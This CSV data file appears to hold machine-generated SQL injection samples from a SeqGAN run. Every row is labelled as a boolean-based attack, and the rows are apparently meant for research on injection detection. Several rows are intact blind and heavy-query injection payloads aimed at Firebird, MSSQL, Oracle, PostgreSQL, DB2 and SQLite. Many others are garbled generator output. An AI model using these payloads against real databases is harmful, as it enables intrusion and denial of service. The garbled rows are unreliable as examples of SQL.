label,payload,family,payload_type,method,run_id,sample_index
attack,"1' or '1%' like '%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '' where or char  (  (  (  *  (/2  =  =  (  =  =  (  7793   =  (  =  =  4018  =  111  69  =   char 3862  =  =  =  3393  =  (  =  * do  riosesyst3,  )      )  llustas t2,atas 7522 t  (  83ex  =  =  =   or char  (  7555 char  106  =    (  *  (  r"" like ""u$and t1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1486
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1487
attack,"1""  =  ""then 3880  t  =  =   =  =  =  =  =  =  100or _s or 2961  =  *  (   5485  =  ( 8315   =  =  ce",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1488
attack,"1'+  (  select 'f2832t%""  =  ""'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'ererererp_mbs t4,rta  =   (  6388 6849  =  select   (    (  2774  =    121  (  = 8691  =  =  6503  =  4018 or char  =  =  =  (    (L  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1489
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'wherehrex  =  =  7555 6388  =  rexp_kdomasystas typtainge char  =  =  = where 1668  3393  * when    =  = from where and xp_ul_asrllere'  =  's as t5  )ibl_ t2,don.cs t3,d_us t1int_t  *  =ex  6093 char 6503  1668  =  0x7171706a71,        =  =  (  5485 6388 1087",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1490
attack,1%'  =  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1491
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1492
attack,1'+  (  select 'ct,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1493
attack,"1')   )    a 2774  =  select t500000000      =  (  =  ralefup_libl_usds absts t3"" where 1661char  *hrp_t  =  =  5389  (  =  (  =  2961  7793  119/pppex  =     )      = 8446744073709551610,ap_tlillugiest_use where e_ 6503 _u  =    3393=  =    (  =    (    =  )  r  (  coubl  (      =  4799",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1494
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%""  =  ""'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1495
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'u8691 rypes 'unusual' alerimas t3  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1496
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1497
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1498
attack,1%' or 8384  =  like  (  'ainbct  (  )   6388  (     =  )Lx    (  and 6671  (    (  or 2649  =    =  1087  = 2961 or char  =  (  =  =  =  112  =  2724  113      (  *  (  (  crypcasustibst_ustt,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1499
attack,1Nw,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1500
attack,"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ubm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1501
attack,select or p,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1502
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'n",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1503
attack,"1   where 6093 where (exp_t_us tasztal_6671 as t2,alpdh_illuinamabtct  =  3393  6388  =  yp_kex   a' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'p_seaimceptyp_lll_us doalvept_ugfiomain.as as as t  3862 or 8571(  =  r_sesys t2s2,s as t2,rt3  (  )  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1504
attack,"1'  )   and 8148  =  like  (  'agug,r"" like ""ug*pp_s orys t  =  =  (  =  =  cos ains t2,repeail_uba,sbsyrs as t2,ll_uiblys ainindguns or 8446744073709551610/*x   (  (  =  113  lec_uprt  =  2649 char  =  1087 or 7793  1 6093 and   (  select or char  =  =  --rexp_ins assi",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1505
attack,-ak,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1506
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '""   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1507
attack,"_   (  2180 char  (  =  =  1087  =  =pcomrert4  )  ,al_ugasubs a,rs tselect domain.s   sus",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1508
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1509
attack,"1%'  =  '' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'' where 4912  =  4912 or 6979  =  like  (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1510
attack,1zj,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1511
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1512
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1513
attack,"4873%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1514
attack,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'uvyzrjzuz ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1515
attack,1'   rhrftzyqj,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1516
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""'+  (  select 'add' where or concat  ,xp_kpelefe",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1517
attack,"1'   (   agex,=  =  2180  (  4018  =  =  =  Nx  (  3862  (  (  3393  lep  =  3352 comaft_ususers ustabsers as tins oreaibnyp_t_kibsbmasefus",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1518
attack,"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1519
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1520
attack,"-2583%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1521
attack,select ctas where 7555  =  2961  =  =  =  h_t  (  =  =  6671 (  =  6671  =  select and and 8315    =  1640ht1l_upo,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1522
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'where where h  =  )e  (  --pt_bh  (  3880  (  1087  (  69  (  =  =ef  (  t  (  =  =  citt_u    anp_s tal_ul_s ain.yst4,tat  (  =  122  =  (  fromiomatys t3  (  * or 2367u  upex  =  3352  =  =  then char  =  =  (  3455  (  ci.sersystab$al",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1523
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  """"  122  select  =  =  =  2l_upegatais comas t3int(  (  =  or   =  5485  =  6388 or or  (  =  (  6671  =  69 7793  =  3880  =  4018  =  ' where 4912  =  4912 or 6979  =  like  (  '  =    (   (  =  =  =  2774s where =  2961  =  L  =  r_kdombmg,sddbstas ases 'unusual'ys 3880 a,troedbleabl_s t3,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1524
attack,-1n8403whereip,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1525
attack,"-%""  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1526
attack,"1""   3455 or count  =  =  =  )  =  riebghef6671tcyp_unrdb$cs aibgexpp  =  ) 5286  gex""  =  =  (  (  6093aing  (  =t_s ap_s comai.ibltains egt(  * where 2774 where 7793 ep_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1527
attack,"1""   )   as 1668   _,fimsystadss tor as 3  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1528
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1529
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'd||cup_guz8571",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1530
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """" like """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1531
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'umim""  )   or   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1532
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1533
attack,1   )    2367 1087 or and  where 4799t  (  =  =  =  =e=  =  )     =  3862  =  6388 3455  (  =   (  (  rgougexp_susms ibm.typiei  leriom.,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1534
attack,1/*,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1535
attack,"4   1570,'  )   and 8148  =  like  (  '9148  111  (  =  =  (  (  =    =    =  s like 6093 3862  redoleal_eft or 3880 *  (  (  =  (   t2,xp_kexpt  (  3862  (  --eand 6388  (  1087  =    (  =  =  2180  =  9198  =  gim.t2instr t1,lt  (  (  =  =  =  =  6503 char  =    (  *  (  3862 1087 cr_intain",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1536
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1537
attack,1%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1538
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1539
attack,"1"" and   or 2642(  (  8459  (  2180    =  =   3880  =    =  (  ,  =  1087  (  =  3862  7522 1087  = t3  =  (  4018ex",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1540
attack,"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1541
attack,1'+  (  select '9148y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1542
attack,1hzr'  =  'w@'  =  'dt,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1543
attack,1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'rhzwpzomabmrd--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1544
attack,"1"" 1441  char char  *  =  3393 char  (  (  3880  (    (    a  (  =  6503   (  =  =  68  =  select)  4165 or 3880 char  rexp1,seginblo  ( or or coubll_tall_kesddvysttt2,gdeaib$gef(  =  6849  rat  (  3880 9643  (  2961  =  r  (  6388 3393  (    (  =  (  x  =  =  =  4018 ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1545
attack,"1""  3484",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1546
attack,"1   )   iba.tasustas tainrt  u  (  4018  =  (  char  *  =  3393  =z(  =  122  select rib$fi ibn.rert1,4462,eringexp_suse",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1547
attack,"-8919"" where ' concat  =    =  (  )    (  rerl_kergexp_s all_us t1,domas taintalhaipyperinsdons where and 5556  3393  =  =  (    (  =  ( ape=  =    =  =  =L  (  6849  =/n or 8571expt  113  =  (  (  8403  (  3484  =  (  =  =   char  9354concat  =  =  =  6849",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1548
attack,"1%char%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1549
attack,1'  =  'asy   atabm,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1550
attack,"1yhrzvecl'  =  ' where where  =  f(  =   4018  (  (  =    =  3862  =  =    =  3880  (     coubmes 3580us ain.omas astrinn.db$fimll_ystabl_sins as ain.s alles frommt 2,, crwhereupe_kexp_kibl1dbft",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1551
